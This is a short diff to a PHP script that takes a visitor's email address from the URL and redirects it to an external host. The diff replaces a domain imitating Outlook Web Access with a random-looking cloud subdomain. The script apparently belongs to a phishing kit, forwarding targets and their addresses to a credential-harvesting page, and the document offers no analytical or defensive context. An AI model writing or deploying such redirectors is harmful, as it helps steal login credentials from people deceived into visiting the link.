@@ -10,5 +10,5 @@ return $emID;
 }
 $em = $_GET['em'];
 $emID = getemIDFromem($em);
-header("Location: https://owacloudlink.ga/?em=$em");
+header("Location: https://mciaufanuxczozxusa-sweet-lizard-jc.us-south.cf.appdomain.cloud/?bbre=zxoiasizx/?em=$em");
 ?>
